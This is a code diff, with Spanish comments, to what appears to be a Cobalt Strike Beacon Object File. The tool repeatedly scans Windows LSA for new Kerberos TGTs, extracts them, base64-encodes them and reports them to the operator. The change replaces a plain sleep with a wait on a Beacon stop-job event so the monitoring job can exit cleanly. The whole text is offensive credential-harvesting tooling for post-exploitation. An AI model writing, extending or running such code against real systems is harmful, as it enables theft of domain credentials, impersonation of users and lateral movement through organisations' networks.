@@ -33,6 +33,9 @@ DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
 DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
 DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetTickCount(void);
 
+// Stop event del beacon — NULL si corre sync, non-NULL si corre async
+DECLSPEC_IMPORT HANDLE BeaconGetStopJobEvent();
+
 // -----------------------------------------------------------------------
 // Helpers
 // -----------------------------------------------------------------------
@@ -128,7 +131,7 @@ static char* b64_encode(BYTE* input, size_t input_len) {
 }
 
 // -----------------------------------------------------------------------
-// IsSystem / GetCurrentToken / GetLsaHandle
+// IsSystem / GetLsaHandle
 // -----------------------------------------------------------------------
 static BOOL IsSystem(void) {
     HANDLE hToken = NULL;
@@ -169,7 +172,7 @@ static BOOL GetLsaHandle(BOOL highIntegrity, HANDLE* hLsa) {
 }
 
 // -----------------------------------------------------------------------
-// ExtractTicket
+// ExtractTicket / ScanAndReport
 // -----------------------------------------------------------------------
 static BOOL ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid,
                            UNICODE_STRING targetName,
@@ -248,7 +251,6 @@ static void ScanAndReport(HANDLE hLsa, ULONG authPackage, BOOL highIntegrity,
             snapshot_add(snap, key);
             if (firstRun) continue;
 
-            // Nuevo TGT — reportar
             char clientName[256]  = {0};
             char clientRealm[256] = {0};
             char svcRealm[256]    = {0};
@@ -305,7 +307,6 @@ void go(char* args, int len) {
 
     int intervalSec = 30;
 
-    // Parsear /interval:
     if (params && param_len > 0) {
         char* p = params;
         while (*p) {
@@ -342,7 +343,6 @@ void go(char* args, int len) {
     internal_printf("    Watching for new TGTs...\n\n");
     printoutput(FALSE);
 
-    // Snapshot en heap — sin variables globales
     TICKET_SNAPSHOT* snap = (TICKET_SNAPSHOT*)intAlloc(sizeof(TICKET_SNAPSHOT));
     if (!snap) {
         internal_printf("[-] Failed to allocate snapshot\n");
@@ -353,13 +353,16 @@ void go(char* args, int len) {
     }
     snap->count = 0;
 
-    // Baseline silencioso
     ScanAndReport(hLsa, authPackage, highIntegrity, snap, TRUE);
 
     DWORD intervalMs = (DWORD)intervalSec * 1000;
 
+    HANDLE hStop = BeaconGetStopJobEvent();
+
     while (1) {
-        KERNEL32$Sleep(intervalMs);
+        DWORD waitResult = KERNEL32$WaitForSingleObject(hStop, intervalMs);
+        if (waitResult == WAIT_OBJECT_0)
+            break;  // stop event señalado — salir limpiamente
         ScanAndReport(hLsa, authPackage, highIntegrity, snap, FALSE);
     }
 
